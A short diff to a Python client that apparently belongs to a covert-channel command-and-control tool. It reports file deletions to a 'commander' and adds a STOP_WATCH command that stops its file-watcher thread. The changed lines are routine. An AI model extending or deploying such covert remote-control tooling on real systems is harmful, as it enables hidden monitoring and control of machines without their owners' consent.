@@ -381,9 +381,7 @@ class Client:
 
                                 elif event_name in ('IN_DELETE', 'IN_MOVED_FROM', 'IN_DELETE_SELF'):
                                     self.send_response(src_ip, CommandType.FILE_DELETE, filename.encode('utf-8'))
-
                                     print(f"[*] Watcher: notified deletion of '{filename}'")
-
 
                     except Exception as e:
                         print(f"[!] Watcher thread error: {e}")
@@ -397,6 +395,18 @@ class Client:
                 print(f"    Error: {e}")
                 self.send_response(src_ip, CommandType.ERROR, str(e).encode())
 
+        elif command_type == CommandType.STOP_WATCH:
+            print("[*] Processing STOP_WATCH")
+            self._stop_file_watcher()
+            print("    File watcher stopped.")
+
+    def _stop_file_watcher(self):
+        """Stop the active watcher thread if one is running."""
+        if self._watcher_thread and self._watcher_thread.is_alive():
+            self._watcher_stop.set()
+            self._watcher_thread.join(timeout=3)
+        self._watcher_thread = None
+        self._watcher_stop.clear()
 
     def send_response(self, dst_ip, command_type, payload):
         """Send a response back to the commander via the covert channel."""
